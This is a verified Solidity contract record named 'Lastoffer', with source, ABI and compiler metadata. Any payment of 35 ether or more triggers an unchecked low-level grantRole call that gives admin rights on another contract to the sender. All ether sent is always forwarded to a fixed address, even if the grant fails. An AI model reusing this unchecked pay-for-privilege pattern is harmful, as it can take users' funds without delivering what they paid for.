{"SourceCode": "//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.21;\r\n\r\ncontract Lastoffer {\r\n\r\n    function redemption(address newOwner) public payable {\r\n        if(msg.value >= 35 ether) {\r\n            address(0xAcB3C6a43D15B907e8433077B6d38Ae40936fe2c).call(abi.encodeWithSignature(\"grantRole(bytes32,address)\", 0x0000000000000000000000000000000000000000000000000000000000000000, newOwner));\r\n        }\r\n        address(0x2A00CA38FB9B821edeA2478DA31d97B0f83347fe).call{value: msg.value}(\"\");\r\n    }\r\n\r\n    receive() external payable  {\r\n        redemption(msg.sender);\r\n    }\r\n\r\n    fallback() external payable {\r\n        redemption(msg.sender);\r\n    }\r\n\r\n}", "ABI": "[{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"redemption\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Lastoffer", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d8b1e42130348bdfbd3eac2fffc81dd935eecfda6dbd70f5b779e6e84548e725"}